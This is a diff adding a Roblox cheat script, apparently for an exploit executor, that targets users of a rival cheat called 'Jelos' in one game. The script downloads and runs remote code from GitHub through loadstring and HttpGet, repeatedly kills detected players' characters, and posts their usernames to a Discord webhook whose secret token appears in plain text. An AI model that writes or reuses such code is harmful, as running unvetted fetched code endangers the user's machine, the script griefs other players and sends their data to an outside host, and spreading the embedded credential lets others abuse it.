@@ -1,0 +1,85 @@
+if game.PlaceId == 402122991 then
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/iiX0Lords/Building/main/GlobalFunction"),true))()
+
+local plr = game.Players.LocalPlayer
+
+local runservice = game:GetService("RunService")
+local userInputService = game:GetService("UserInputService")
+
+local disabled = false
+
+local JelosUsers = {}
+
+local function FireWebhook(user)
+    local url =
+    "https://discord.com/api/webhooks/936206344481030154/EyvxcYsmLhUmaZ_AXTHdtdCtZz_1xQ606jU_HGxjW3EpvfSLEGIhLMQOZvz4WpY44IPH"
+    local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "**Someone with Jelos has been detected**",
+            ["description"] = "Username " ..user.Name.." and is in "..plr.Name.."'s game",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                    tostring(user.Name)
+            }
+        }
+    }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+    ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+userInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.End then
+        if disabled == false then
+            disabled = true
+            else
+            disabled = false
+            for i,v in pairs(game.Players:GetPlayers()) do
+                if table.find(JelosUsers,v.Name) then
+                    _G.Kill(v.Character)
+                end
+            end
+        end
+    end
+end)
+
+
+runservice.RenderStepped:Connect(function()
+    local players = game.Players:GetPlayers()
+
+    for i,v in pairs(players) do
+        if v:FindFirstChild("netflix") then
+            if table.find(JelosUsers,v.Name) then return end
+            print(v.Name.." Is using Jelos")
+            table.insert(JelosUsers,v.Name)
+            _G.Kill(v.Character)
+            FireWebhook(v)
+            
+
+            v.CharacterAdded:Connect(function()
+                if disabled == true then return end
+                task.wait(1)
+                _G.Kill(v.Character)
+            end)
+
+        end
+    end
+end)
+
+game.Players.PlayerRemoving:Connect(function(player)
+    if table.find(JelosUsers,player.Name) then
+        local tablePos = table.find(JelosUsers,player.Name)
+        table.remove(JelosUsers,tablePos)
+    end
+end)
+end
